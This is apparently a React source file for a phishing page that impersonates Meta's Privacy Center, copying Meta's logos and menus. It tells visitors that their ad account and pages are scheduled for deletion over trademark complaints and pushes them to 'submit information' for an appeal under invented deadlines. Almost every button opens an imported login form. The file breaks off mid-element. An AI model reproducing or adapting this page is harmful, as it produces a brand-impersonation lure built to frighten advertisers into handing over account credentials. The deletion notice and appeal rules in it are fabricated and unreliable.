import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "./App.scss";
import LoginForm from "./LoginForm";
import { useRef } from "react";

function App() {
  const [isShowModal, setIsShowModal] = useState(false);
  const [isShow1, setIsShow1] = useState(false);
  const [isShow2, setIsShow2] = useState(false);
  const [isShow3, setIsShow3] = useState(false);
  const [showIntro, setShowIntro] = useState(true);

  const videoRef = useRef();
  useEffect(() => {
    const video = videoRef.current;

    const handleEnded = () => {
      setShowIntro(false);
    };

    if (video) {
      video.addEventListener("ended", handleEnded);
    }

    return () => {
      if (video) {
        video.removeEventListener("ended", handleEnded);
      }
    };
  }, []);
  const leftRef = useRef(null);

  const handleShowForm = () => {
    setIsShowModal(true);
  };
  const [showMenu, setShowMenu] = useState(false);
  const isMobile = window.innerWidth <= 768; // hoặc dùng useMediaQuery
  const handleCloseForm = () => {
    setIsShowModal(false);
  };

  const navigate = useNavigate();
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (
        showMenu &&
        leftRef.current &&
        !leftRef.current.contains(event.target)
      ) {
        setShowMenu(false);
      }
    };

    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [showMenu]);

  return (
    <>
      <div className="container">
        <div className={`left ${showMenu ? "show" : "hide"}`} ref={leftRef}>
          <div className="left-content">
            <svg
              aria-label="Meta logo"
              className="x1kpxq89 x1247r65"
              role="img"
              viewBox="0 0 500 100"
            >
              <defs>
                <linearGradient
                  gradientUnits="userSpaceOnUse"
                  id=":r2:"
                  x1="124.38"
                  x2="160.839"
                  y1="99"
                  y2="59.326"
                >
                  <stop offset=".427" stopColor="#0278F1"></stop>
                  <stop offset=".917" stopColor="#0180FA"></stop>
                </linearGradient>
                <linearGradient
                  gradientUnits="userSpaceOnUse"
                  id=":r3:"
                  x1="42"
                  x2="-1.666"
                  y1="4.936"
                  y2="61.707"
                >
                  <stop offset=".427" stopColor="#0165E0"></stop>
                  <stop offset=".917" stopColor="#0180FA"></stop>
                </linearGradient>
                <linearGradient
                  gradientUnits="userSpaceOnUse"
                  id=":r4:"
                  x1="27.677"
                  x2="132.943"
                  y1="28.71"
                  y2="71.118"
                >
                  <stop stopColor="#0064E0"></stop>
                  <stop offset=".656" stopColor="#0066E2"></stop>
                  <stop offset="1" stopColor="#0278F1"></stop>
                </linearGradient>
              </defs>
              <path
                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                fill="#1C2B33"
              ></path>
              <path
                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                fill="#0180FA"
              ></path>
              <path
                d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
                fill="url(#:r2:)"
              ></path>
              <path
                d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
                fill="url(#:r3:)"
              ></path>
              <path
                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                fill="url(#:r4:)"
              ></path>
            </svg>
            <p className="title">Privacy Center</p>
            <button className="btn-lock">
              <svg
                width="12"
                height="12"
                viewBox="0 0 12 12"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M9.5035 4.99843L6.3345 2.14643C6.24269 2.06379 6.12353 2.01806 6 2.01806C5.87647 2.01806 5.75731 2.06379 5.6655 2.14643L2.4965 4.99843C2.34021 5.1391 2.21525 5.31106 2.12971 5.50315C2.04418 5.69523 1.99999 5.90316 2 6.11343V9.41843C2 9.52643 2.035 9.60843 2.0745 9.65843C2.10894 9.70393 2.15999 9.73395 2.2165 9.74193C2.6465 9.81193 3.2365 9.88693 4 9.93743V7.99993C4 7.6021 4.15804 7.22057 4.43934 6.93927C4.72064 6.65796 5.10218 6.49993 5.5 6.49993H6.5C6.89782 6.49993 7.27936 6.65796 7.56066 6.93927C7.84196 7.22057 8 7.6021 8 7.99993V9.93743C8.59725 9.90063 9.19241 9.83555 9.7835 9.74243C9.84008 9.73432 9.89115 9.70411 9.9255 9.65843C9.97637 9.58896 10.0026 9.50449 10 9.41843V6.11343C10 5.90316 9.95582 5.69523 9.87029 5.50315C9.78475 5.31106 9.65979 5.1391 9.5035 4.99843ZM1.8275 4.25493L4.9965 1.40293C5.27194 1.15501 5.62941 1.01782 6 1.01782C6.37059 1.01782 6.72806 1.15501 7.0035 1.40293L10.1725 4.25493C10.433 4.4894 10.6413 4.77602 10.7838 5.0962C10.9264 5.41638 11 5.76295 11 6.11343V9.41843C11 10.0644 10.582 10.6249 9.945 10.7289C9.475 10.8054 8.841 10.8849 8.0285 10.9379C7.466 10.9744 7 10.5199 7 9.95593V7.99993C7 7.86732 6.94732 7.74014 6.85355 7.64638C6.75979 7.55261 6.63261 7.49993 6.5 7.49993H5.5C5.36739 7.49993 5.24021 7.55261 5.14645 7.64638C5.05268 7.74014 5 7.86732 5 7.99993V9.95593C5 10.5199 4.534 10.9744 3.9715 10.9379C3.32985 10.899 2.69045 10.8293 2.0555 10.7289C1.418 10.6249 1 10.0649 1 9.41893V6.11343C0.999952 5.76295 1.0736 5.41638 1.21616 5.0962C1.35871 4.77602 1.567 4.4894 1.8275 4.25493Z"
                  fill="white"
                ></path>
              </svg>
              Home Page
            </button>
            <button className="btn-lock-child" onClick={handleShowForm}>
              <svg
                viewBox="0 0 24 24"
                fill="currentColor"
                width="1em"
                height="1em"
                aria-hidden="true"
                className="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z"
                ></path>
              </svg>
              Search
            </button>
            <button
              className="btn-lock-child"
              onClick={() => setIsShow1((prev) => !prev)}
            >
              <svg
                viewBox="0 0 24 24"
                fill="currentColor"
                width="1em"
                height="1em"
                aria-hidden="true"
                className="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
              >
                <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z"
                ></path>
              </svg>
              Privacy Policy
              {isShow1 ? (
                <i className="fa-solid fa-chevron-up"></i>
              ) : (
                <i className="fa-solid fa-chevron-down"></i>
              )}
            </button>
            {isShow1 && (
              <ul>
                <li onClick={handleShowForm}>
                  What is the Privacy Policy and what does it cover?
                </li>
                <li onClick={handleShowForm}>
                  What information do we collect?
                </li>
                <li onClick={handleShowForm}>
                  How do we use your information?
                </li>
                <li onClick={handleShowForm}>
                  How do we share your information on Meta Products or with
                  integrated partners?
                </li>
                <li onClick={handleShowForm}>
                  How do we share information with third parties?
                </li>
                <li onClick={handleShowForm}>
                  How is the cooperation between Meta Companies organized?
                </li>
                <li onClick={handleShowForm}>
                  How can you manage or delete your information and exercise
                  your rights?
                </li>
                <li onClick={handleShowForm}>
                  How long do we keep your information?
                </li>
                <li onClick={handleShowForm}>
                  How do we transmit information?
                </li>
                <li onClick={handleShowForm}>
                  How do we respond to official requests, comply with applicable
                  laws, and prevent harm?
                </li>
                <li onClick={handleShowForm}>
                  How will you know when the policy changes?
                </li>
                <li onClick={handleShowForm}>How to ask Meta questions?</li>
                <li onClick={handleShowForm}>
                  Why and how we process your data?
                </li>
              </ul>
            )}
            <button
              className="btn-lock-child"
              onClick={() => setIsShow2((prev) => !prev)}
            >
              <svg
                viewBox="0 0 24 24"
                fill="currentColor"
                width="1em"
                height="1em"
                aria-hidden="true"
                className="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z"
                ></path>
              </svg>
              Other rules and articles
              {isShow2 ? (
                <i className="fa-solid fa-chevron-up"></i>
              ) : (
                <i className="fa-solid fa-chevron-down"></i>
              )}
            </button>
            {isShow2 && (
              <ul>
                <li onClick={handleShowForm}>Cookie Policy</li>
                <li onClick={handleShowForm}>
                  Information for those who do not use Meta Products
                </li>
                <li onClick={handleShowForm}>
                  How Meta uses information for generative AI models?
                </li>
                <li onClick={handleShowForm}>Data Transfer Framework Policy</li>
                <li onClick={handleShowForm}>Other terms and conditions</li>
              </ul>
            )}
            <button
              className="btn-lock-child"
              onClick={() => setIsShow3((prev) => !prev)}
            >
              <svg
                viewBox="0 0 24 24"
                fill="currentColor"
                width="1em"
                height="1em"
                aria-hidden="true"
                className="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z"
                ></path>
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="m22.191 9.207-2.224 2.06a8.112 8.112 0 0 1 0 1.466l2.224 2.06a1 1 0 0 1 .187 1.233l-1.702 2.948a1 1 0 0 1-1.162.455l-2.895-.896a7.991 7.991 0 0 1-1.27.735l-.672 2.954a1 1 0 0 1-.975.778H10.3a1 1 0 0 1-.975-.778l-.672-2.954a8 8 0 0 1-1.27-.735l-2.895.896a1 1 0 0 1-1.162-.455l-1.702-2.948a1 1 0 0 1 .187-1.233l2.224-2.06a8.1 8.1 0 0 1 0-1.466L1.81 9.207a1 1 0 0 1-.187-1.233l1.702-2.948a1 1 0 0 1 1.162-.455l2.895.896a7.992 7.992 0 0 1 1.27-.735l.672-2.954A1 1 0 0 1 10.299 1h3.403a1 1 0 0 1 .975.778l.672 2.954a7.99 7.99 0 0 1 1.27.735l2.895-.896a1 1 0 0 1 1.162.455l1.702 2.948a1 1 0 0 1-.187 1.233zm-8.574-3.071.894.412c.335.155.653.34.952.551l.805.57 3.075-.951.903 1.564-2.36 2.186.09.98a6.093 6.093 0 0 1 0 1.104l-.09.98 2.36 2.185-.903 1.565-3.075-.951-.805.57a5.993 5.993 0 0 1-.952.55l-.894.413L12.904 21h-1.807l-.713-3.136-.894-.412a5.993 5.993 0 0 1-.952-.551l-.805-.57-3.075.951-.904-1.565 2.36-2.185-.089-.98a6.102 6.102 0 0 1 0-1.104l.09-.98-2.36-2.186.903-1.564 3.075.951.805-.57c.299-.212.617-.396.952-.55l.894-.413L11.097 3h1.807l.713 3.136z"
                ></path>
              </svg>
              Settings
              {isShow3 ? (
                <i className="fa-solid fa-chevron-up"></i>
              ) : (
                <i className="fa-solid fa-chevron-down"></i>
              )}
            </button>
            {isShow3 && (
              <ul>
                <li onClick={handleShowForm}>Facebook Settings</li>
                <li onClick={handleShowForm}>Instagram Settings</li>
              </ul>
            )}
          </div>
        </div>
        <div className="right">
          <div className="mobile-logo-wrapper">
            <img
              src="/metalogo.svg"
              alt="Meta Logo"
              className="meta-logo-mobile"
            />
          </div>
          {isMobile && (
            <div
              className="hamburger-icon"
              onClick={() => setShowMenu((prev) => !prev)}
            >
              <img src="/hamburger.svg" alt="Menu" />
            </div>
          )}

          <div className="right-content">
            <div className="title">
              <img src="/delete.png" alt="" />
              <h3>{`We have scheduled your ad account and pages for deletion.`}</h3>
            </div>
            <div className="content-bottom">
              <h4>
                We have received many reports that your ads violate our
                trademark and intellectual property rights. After careful
                consideration, we have made a decision on this matter.
              </h4>
              <br />
              <h4>
                If no corrective actions are taken, your advertising account
                will be permanently deleted. If you wish to appeal this
                decision, please submit an appeal request to us for review and
                assistance.
              </h4>
              <br />
              <h4>Appeal Guide</h4>
              <br />
              <p>
                Fact checkers may not respond to requests that contain
                intimidation, hate speech, or other verbal threats.
              </p>
              <br />
              <p>
                In your appeal, please include all necessary information to
                allow the fact checker to process your request in a timely
                manner. If you provide an invalid email address or do not
                respond to a request for additional information within 2 days,
                the fact checker may close the application without processing.
                If the appeal is not processed within 4 days, Meta will
                automatically reject it.
              </p>
            </div>
            <div className="border-box">
              <img
                src="/imgi_3_shild.eca4fb565452b837de2f.png"
                alt="hihi"
                width="100%"
              />
              {/* <div className="bottom">
                <p className="verify">
                  <div className="icon">
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z"
                        fill="#FFCC33"
                      ></path>
                    </svg>
                  </div>
                  Intellectual Property Infringement – Unauthorized use of
                  copyrighted content.{" "}
                </p>
                <hr className="custom-hr"></hr>
                <p className="verify">
                  <div className="icon">
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z"
                        fill="#FFCC33"
                      ></path>
                    </svg>
                  </div>
                  False or Misleading Information – Spreading deceptive or
                  inaccurate content.{" "}
                </p>
                <hr className="custom-hr"></hr>
                <p className="verify">
                  <div className="icon">
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z"
                        fill="#FFCC33"
                      ></path>
                    </svg>
                  </div>
                  Inappropriate or Harmful Content – Including hate speech,
                  violence, or harassment.{" "}
                </p>
                <hr className="custom-hr"></hr>
                <p className="verify">
                  <div className="icon">
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z"
                        fill="#FFCC33"
                      ></path>
                    </svg>
                  </div>
                  Advertising Policy Violations – Running ads that do not comply
                  with Meta's guidelines.{" "}
                </p>{" "}
                <hr className="custom-hr"></hr>
                <p className="verify">
                  <div className="icon">
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M8.98151 1.56642C8.53763 0.811193 7.46546 0.811193 7.02158 1.56642L0.164626 13.2331C-0.292407 14.0107 0.256279 15 1.14459 15H14.8585C15.7468 15 16.2955 14.0107 15.8385 13.2331L8.98151 1.56642ZM8 5C8.53541 5 8.95377 5.46228 8.9005 5.99504L8.54975 9.50248C8.52151 9.78492 8.28384 10 8 10C7.71616 10 7.47849 9.78492 7.45025 9.50248L7.0995 5.99504C7.04623 5.46229 7.46459 5 8 5ZM8.00154 11C8.55383 11 9.00154 11.4477 9.00154 12C9.00154 12.5523 8.55383 13 8.00154 13C7.44926 13 7.00154 12.5523 7.00154 12C7.00154 11.4477 7.44926 11 8.00154 11Z"
                        fill="#FFCC33"
                      ></path>
                    </svg>
                  </div>
                  Suspicious Activity – Unusual login attempts or automated
                  behavior.{" "}
                </p>
              </div> */}
              <div className="bottom">
                <h3>Submit Information</h3>
                <h4>
                  This form is only to be used for submitting appeals and
                  restoring account status
                </h4>
                <p>
                  Please ensure that you provide the requested information
                  below. Failure to do so may delay the processing of your
                  appeal.
                </p>
              </div>
              <div className="btn-show">
                <button onClick={handleShowForm}>Submit Information</button>
              </div>
              {/* <p className="desc">
                If we do not receive a response within 24 hours, this decision
                will be final, and your page will be permanently removed.
              </p> */}
            </div>
            <br />
            <div className="content-bottom">
              <h3>What is trademark infringement?</h3>
              <br />
              <h4>
                Generally, trademark infringement occurs when all three of the
                following requirements are met:
              </h4>
              <ul>
                <li>
                  1. A company or person uses a trademark owner's trademark (or
                  similar trademark) without permission.
                </li>
                <li>
                  2. That use is in commerce, meaning that it's done in
                  connection with the sale or promotion of goods or services.
                </li>
                <li>
                  3. That use is likely to confuse consumers about the source,
                  endorsement or affiliation of the goods or services.
                </li>
              </ul>
              <br />
              <p>
                The touchstone of trademark infringement is often "likelihood of
                confusion", and there are many factors that determine whether a
                use of a trademark is likely to cause confusion. For example,
                when a person's trademark is also used by someone else, but on
                unrelated goods or services, that use may not be infringement
                because it may not cause confusion. Which party used the
                trademark first can often be an important consideration as well.
              </p>
            </div>
            <br />
            <h4>Privacy Center</h4>
            <div className="action-button-list" onClick={handleShowForm}>
              <div className="action-button b-bottom">
                <div className="action-icon">
                  <img src="/icon-women.png" alt="1ssad" />
                </div>
                <div className="action-text">
                  <span>What is the Privacy Policy and what does it say?</span>
                  <br />
                  <span className="small-grey">Privacy Policy</span>
                </div>
                <div className="action-arrow">
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z"
                      fill="black"
                    ></path>
                  </svg>
                </div>
              </div>

              <div className="action-button b-bottom" onClick={handleShowForm}>
                <div className="action-icon">
                  <img src="/icon-women.png" alt="1ssad" />
                </div>
                <div className="action-text">
                  <span>How you can manage or delete your information</span>
                  <br />
                  <span className="small-grey">Privacy Policy</span>
                </div>
                <div className="action-arrow">
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z"
                      fill="black"
                    ></path>
                  </svg>
                </div>
              </div>
            </div>
            <h4>For more details, see the User Agreement</h4>
            <div className="action-button-list">
              <div className="action-button b-bottom" onClick={handleShowForm}>
                <div className="action-icon">
                  <img src="/icon-docs.png" alt="1ssad" />
                </div>
                <div className="action-text">
                  <span>Meta AI</span>
                  <br />
                  <span className="small-grey">User Agreement</span>
                </div>
                <div className="action-arrow">
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z"
                      fill="black"
                    ></path>
                  </svg>
                </div>
              </div>
            </div>
            <h4>Additional resources</h4>
            <div className="action-button-list" onClick={handleShowForm}>
              <div className="action-button b-bottom lucky">
                <div className="action-text">
                  <span>
                    How Meta uses information for generative AI models
                  </span>
                  <br />
                  <span className="small-grey">Privacy Center</span>
                </div>
                <div className="action-arrow">
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
